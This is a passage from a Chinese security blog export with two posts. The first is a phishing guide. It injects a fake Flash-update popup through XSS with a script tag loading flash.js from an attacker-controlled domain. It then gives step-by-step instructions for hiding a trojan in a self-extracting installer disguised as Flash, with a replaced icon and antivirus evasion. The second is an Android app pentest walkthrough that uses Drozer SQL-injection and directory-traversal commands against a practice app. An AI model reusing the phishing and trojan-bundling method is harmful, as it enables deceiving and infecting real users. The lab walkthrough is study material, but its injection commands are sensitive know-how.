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')}#foot{background-color:rgba(248,248,248);height:257px;border-radius:0px 0px 10px 10px}#warnning{font-size:24px}#content{position:relative;width:534px;height:180px;margin:0px auto;top:30px;z-index:8888}#contentValue{font-size:17px}#button{position:relative;width:141px;height:40px;border-radius:4px;background-image:linear-gradient(to bottom right,rgba(248,217,25),rgba(252,195,0));background-image:url('data:image/png;base64,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');font-size:18px;line-height:40px;margin-right:50px;text-align:center;float:right;z-index:9999}#button:hover{cursor:pointer}&lt;/style&gt;&lt;div id='main'&gt;&lt;div id='flash'&gt;&lt;div id='head'&gt;&lt;/div&gt;&lt;div id='foot'&gt;&lt;div id='content'&gt;&lt;font id='warnning'&gt;\\u60a8\\u7684flash\\u7248\\u672c\\u8fc7\\u4f4e\\uff0c\\u8bf7\\u53ca\\u65f6\\u5347\\u7ea7\\u5230\\u6700\\u65b0\\u7248\\u672c\\uff01&lt;/font&gt;&lt;br&gt;&lt;br&gt;&lt;p id='contentValue'&gt;\\u7cfb\\u7edf\\u68c0\\u6d4b\\u5230\\u60a8\\u7684flash\\u7248\\u672c\\u8fc7\\u4f4e\\uff0c\\u6709\\u88ab\\u6f0f\\u6d1e\\u653b\\u51fb\\u98ce\\u9669\\uff0c\\u4e14\\u4e25\\u91cd\\u5f71\\u54cd\\u6e38\\u620f\\u3001\\u89c6\\u9891\\u4f53\\u9a8c\\uff0c\\u5347\\u7ea7\\u5230\\u6700\\u65b0\\u5b98\\u65b9\\u6388\\u6743\\u7248\\u672c\\u83b7\\u5f97\\u66f4\\u597d\\u7684\\u4e0a\\u7f51\\u4f53\\u9a8c\\u3002&lt;/p&gt;&lt;/div&gt;&lt;div id='button' onclick=window.location.href='target'&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&quot; window.onload = function(){ $(&quot;.layui-layer&quot;).css(&quot;background&quot;, &quot;none&quot;); layer.open({ type: 1,//Page层类型 move: false ,//禁止拖拽 area: ['613px', '324px'],//设置弹窗大小 title: false,//关闭标题栏 shade: 0.5,//遮罩透明度 //maxmin: true ,//允许全与屏最小化 closeBtn: 0 ,//取消关闭按钮 anim: 0,//0-6的动画形式，-1不开启 offset: '100px',//设置顶部距离 scrollbar: false,//禁用滚轮 content: content }); } 去申请一个域名AAA记录为flash，得到flash.xxxx.xxx/flash.js 钓鱼xss &lt;script src=http://flash.xxx.xxx/flash.js&gt;&lt;/script&gt; 伪造 首先获取flash官方安装文件 然后需要用到rar来进行伪造 1、同时选中官方文件和木马，创建自解压文件。 2、选择高级-自解压选项-更新-解压并更新文件/覆盖所有文件 3、选择高级-自解压选项-常规-设置解压路径 4、设置提取后运行的文件 5、设置模式全部隐藏 6、点击确定后生成文件 7、为了更具有迷惑性使用 ResourceHacker修改图标，将文件拖入后选择操作-替换图标。 8、选中官方的flash文件，点击替换，并另存为保存，命名为官网相同文件名 虽然在注释中能够看到危险执行 但是杀毒并不会检测这个，只有对木马文件最好免杀即可 9、最后改个名上传到网站，再将flash.js文件中的下载链接改为伪造文件即可钓鱼 后记 只是一个参考，钓鱼重要的是看人下菜，也可以用其他软件去进行捆绑木马文件达到上线目的 但是js文件要使html页面生成的惟妙惟肖才能达到欺骗的效果 ","link":"https://liangyueliangyue.github.io/post/flash-diao-yu/"},{"title":"APP渗透测试学习","content":" 全局扫描 mobsf 安装要求 Install Git Install Python 3.8-3.9 Install JDK 8+ Install Microsoft Visual C++ Build Tools Install OpenSSL (non-light) Download &amp; Install wkhtmltopdf as per the wiki instructions Add the folder that contains wkhtmltopdf binary to environment variable PATH. 安装 git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git cd Mobile-Security-Framework-MobSF setup.bat 记得访问然后改host文件 https://ipaddress.com/website/raw.githubusercontent.com 启动 run.bat localhost:8000 服务端APP测试 夜神模拟器 多个Android 版本（有些APP可能不兼容） 首先确保和电脑同一网段（能够互通），然后去设置代理 设置-WiFi-长按WiFi名字-修改网络 设置代理为手动 代理服务器主机名为burp的IP地址（也就是本机的） ,端口为监听端口 burp配置 在burp上就可以接收到模拟器上的流量了 模拟器中打开浏览器地址栏输入http://burp，右上角下载证书 打开Amaze左边最近访问文件找到刚刚那个文件重命名后缀为.cer 我这里改不掉，只能通过文件助手找到共享目录然后修改后缀名 ------退回首页------设置------安全------从SD卡安装------找到刚刚那个.cer文件------然后安装即可，名字随便，完美 然后回到主页-设置-安全-从sd卡安装，找到cer文件然后安装 安装完成可以收到流量包了 但是模拟器会有一致证书错误的问题，在浏览器右上角点开设置 隐私与安全-显示安全警告关闭再返回就一切正常了 真机 电脑开启热点，然后手机连上 设置代理为上面ip的网关（我这里是.1 -&gt;192.168.137.202） 保存之后，先用电脑访问指定ip端口下载证书 将证书后缀名改为.cer，传输到手机上 安装即可 客户端APP测试 静态测试 资源文件获取 可以提取出图片文件和布局文件进行使用查看，主要查看res文件下xml文件、AndroidManifest.xml和图片。 APKtools https://ibotpeaches.github.io/Apktool/install/ windows配置过程（其实也就是环境变量） 首先将bat文件下载到指定目录 然后将jar文件下载到指定目录 https://bitbucket.org/iBotPeaches/apktool/downloads/ 然后为指定目录配置环境变量 然后命令行就可以执行apktool了 使用方法 输入 apktool d 123.apk d 代表解码（反编译）该123.APK 输入 apktool b 123 -o 111.apk b 代表把当前反编译出来的123文件重建（重打包）成111.apk apk重打包后需要重新进行签名 apk反编译-&gt;java源码 dex2jar 将classes.dex转化成jar文件 使用 将APK直接解压（修改后缀名为.zip，然后解压）后，可以看到目录下包含一个classes.dex文件。 如下图所示，而我们的源码就在这个classes.dex 文件中。 然后放入d2j-dex2jar目录下 .\\d2j-dex2jar.bat classes.dex 会得到classes-dex2jar.jar文件 java源码逆向 jd-gui 查看jar文件进行漏洞分析 jeb，jadx 更加直接获取 解包全局找http，当web来打 全局扫描可以用mobsf，组件等测试使用的drozer（mobsf动态扫描也可以但是结果不太准确），hook使用的是XposedBridge和frida。以上是个人经验 动态测试 四大组件 Activity Activity是Android组件中最基本也是最为常见用的四大组件之一。 Activity是一个应用程序组件，提供一个屏幕，用户可以用来交互为了完成某项任务。 Activity中所有操作都与用户密切相关，是一个负责与用户交互的组件，可以通过setContentView(View)来显示指定控件。 在一个android应用中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。Activity之间通过Intent进行通信。 Service Service 也是Android 四大组件之一，有着非常重要的作用。 Service 被设计为在后台长时间执行而不需要提供页面的任务。 Service有两种启动方式，startService与bindService content provider （1）android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。 （2）只有需要在多个应用程序间共享数据是才需要内容提供者。例如，通讯录数据被多个应用程序使用，且必须存储在一个内容提供者中。它的好处是统一数据访问方式。 （3）ContentProvider实现数据共享。ContentProvider用于保存和获取数据，并使其对所有应用程序可见。这是不同应用程序间共享数据的唯一方式，因为android没有提供所有应用共同访问的公共存储区。 （4）开发人员不会直接使用ContentProvider类的对象，大多数是通过ContentResolver对象实现对ContentProvider的操作。 （5）ContentProvider使用URI来唯一标识其数据集，这里的URI以content://作为前缀，表示该数据由ContentProvider来管理。 BroadcastReceiver 在Android中，广播是一种广泛运用的在应用程序之间传输信息的机制。而广播接收器是对发送出来的广播进行过滤接受并响应的一类组件。可以使用广播接收器来让应用对一个外部时间做出响应。例如，当电话呼入这个外部事件到来时，可以利用广播接收器进行处理。当下载一个程序成功完成时，仍然可以利用广播接收器进行处理。广播接收器不NotificationManager来通知用户这些事情发生了。广播接收器既可以在AndroidManifest.xml中注册，也可以在运行时的代码中使用Context.registerReceive（）进行注册。只要是注册了，当事件来临时，即使程序没有启动，系统也在需要的时候启动程序。各种应用还可以通过使用Context.sendBroadcast（）将它们自己的Intent广播给其他应用程序。 组件测试-Drozer Drozer是一款领先的Android安全测试框架 https://labs.f-secure.com/tools/drozer/ 环境及工具安装 运行Drozer需要java环境、python27环境、adb调试工具、真实手机、夜神安卓模拟器、Drozer-2.4.4、drozer-agent-2.3.4。 操作系统：Windows10专业版 JAVA环境：jdk1.8.0_241 Python环境：Python 2.7.17 adb即安卓调试桥，是一个命令行窗口工具，用于PC端与安卓设备进行交互，官网下载安装包和Android通用驱动，一键安装，配置环境变量。 https://adbshell.com/downloads 添加好Path环境变量，命令行测试 4、Drozer安装 首先从官网下载电脑端drozer和手机端安装包 官网：https://labs.f-secure.com/tools/drozer/ 打开msi文件直接安装，再安装过程中会遇到设置运行环境的问题，因为检测到的环境是python3，所以要手动指定python 2.7环境，一路next即可。 5、Drozer-agent安装 这里夜神模拟器直接指定即可 adb登录设备 一般adb devices即可 如果无法连接，可以尝试重启模拟器 或者找到NoxVMHandle.exe对应的PID，这里是2608，再根据此PID查找模拟器和电脑连接的TCP端口,并找到127.0.0.1:62xxx的地址。 tasklist | findstr &quot;Nox&quot; --查看任务列表 netstat -ano | findstr PID --显示此PID的网络连接情况 adb connect 127.0.0.1:62001 adb shell tips：这里为什么adb老是重连是因为nox自带adb，将自己adb覆盖掉nox/bin下的adb.exe和nox_adb.exe即可 Drozer连接手机 首先配置drozer agent 开启 开始连接，drozer Server默认监听端口为31415，同样需要与主机上的31415端口进行通信。 adb forward tcp:31415 tcp:31415 --端口转发 启动drozer drozer console connect 实战演练 测试app可从drozer官网下载得到 1、安装测试app 2、打开app根据提示为其设置一些信息，以供后期使用（这里密码最小16位，不能含有特殊字符，PIN码和其他信息随便填） 密码：qwertyuiopasdfghjkl，pin：1229 new password service：test username：lyy email：2000083869@qq.com password:123456 3.首先获取Android设备里的指定app run app.package.list -f sieve 会乱码，所以需要修改中的drozer\\modules\\app\\package.py开头加上 import sys reload(sys) sys.setdefaultencoding('utf-8') 再次运行 4、获取一下该应用的基本信息，可以看到该APP的安装路径及数据目录 run app.package.info -a 包名 run app.package.info -a com.mwr.example.sieve 5、接下来看看该app是否有暴露的组件攻击面，组件暴露可能导致敏感信息泄露、拒绝服务、权限提升绕过，界面劫持、远程代码执行等安全漏洞 run app.package.attacksurface 包名 run app.package.attacksurface com.mwr.example.sieve 根据测试的返回信息可以看出暴露了3个activity组件，2个provisers组件，2个services组件，并且可被调试。 6、对暴露的activity组件进行攻击，可以显示一些控件也可以监听并处理用户的事件做出响应。暴露的activity意味着可以被导出，可以分析是否存在数据泄露。 run app.activity.info -a 包名 run app.activity.info -a com.mwr.example.sieve 返回了三个组件信息，第一个应该是跟文件有关系，第二个应该是和登录有关系，第三个应该是和密码相关，那activity组件暴露意味着是否存在越权漏洞，绕过前端登录，一个个给他试试。 7、启动暴露的组件信息 启动一次需要重启adb一次？，且需要开着app run app.activity.start -–component 包名 组件名 run app.activity.start -–component com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity run app.activity.start -–component com.mwr.example.sieve com.mwr.example.sieve.MainLoginActivity run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList 8、再测一下Content Provider组件，获取一下它的信息，可以获取到该app还和哪些应用程序有交互，使它指定的一些数据集提供给其他应用程序。那这里可以看到应该是有一些数据库交互，文件备份之类的信息。 run app.provider.info -a 包名 run app.provider.info -a com.mwr.example.sieve 9、一个应用，肯定是有URI（统一资源标志符），用于指向一个资源的字符串，可以是指向本地，也可以是指向互联网，URL一定是URI，但URI不一定是URL。获取一下该app可以访问的URI： run scanner.provider.finduris -a com.mwr.example.sieve 那这个信息就很敏感了 10、访问一下URI所指向的资源 run app.provider.query 查询到的URI run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords 11、对可以访问的URI进行SQL注入，来，试一下获取个人信息这个库所有的表。 run app.provider.query 查询到的URI --projection &quot;* FROM SQLITE_MASTER WHERE type='table';--&quot; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type='table';--&quot; 12、获取一下Passwords和Key这两个表的数据，成功的通过SQL注入获取信息。当然，可以对这些可访问的URI尝试进行操作，如果在注入的过程中报错的话，那就存在SQL注入漏洞。 run app.provider.query URI --projection &quot;* FROM 表名;--&quot; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Passwords;--&quot; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot; 13、当然也可以用模块进行批量的检测哪些URI存在SQL注入漏洞，可以看到很多的SQL注入漏洞，一个个试一下。 run scanner.provider.injection -a com.mwr.example.sieve 14、检测一下是否存在目录遍历漏洞，目录遍历可造成网站信息可被任意访问，敏感数据泄露，扫描到这么多呢。 run scanner.provider.traversal -a com.mwr.example.sieve 15、由于Android基于Linux内核开发，那利用这个目录遍历漏洞查看一下hosts文件吧。 run app.provider.read 遍历路径/文件路径 run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 16、那顺便再把它的数据库也给下载下来，也算是要结束了。 run app.provider.download 数据库URI 本地路径/备份文件名.db run app.provider.download 数据库URI 本地路径/备份文件名.db hook-frida（签名算法解决） Frida是一款基于Python + JavaScript 的hook框架，本质是一种动态插桩技术，可以插入一些代码到原生app的内存空间去（动态地监视和修改其行为）。其使用了C-S模型，利用Frida内核和谷歌V8引擎hook进程。可以轻松实现Windows、Linux、Android、IOS、Mac平台的动态插桩需求，单从Android层面理解，它可以实现Java层和Native层Hook操作。 Frida分为客户端和服务端，客户端通过Python代码将需要被注入的JS代码提交到服务端，然后接受服务端消息；服务端接受JS代码并将其注入到目标进程中，操作内存空间然后给客户端发送消息。 Hook原理 Hook的本质就是劫持函数调用。由于处于Linux用户态，每个进程都有自己独立的进程空间，所以必须先注入到所要Hook的进程空间，修改其内存中的进程代码，替换其过程表的符号地址。在Android中一般是通过ptrace函数附加进程，然后向远程进程注入so库，从而达到监控以及远程进程关键函数挂钩。 一般Frida逆向三阶段： 阶段一.分析程序执行逻辑，函数参数，函数返回值 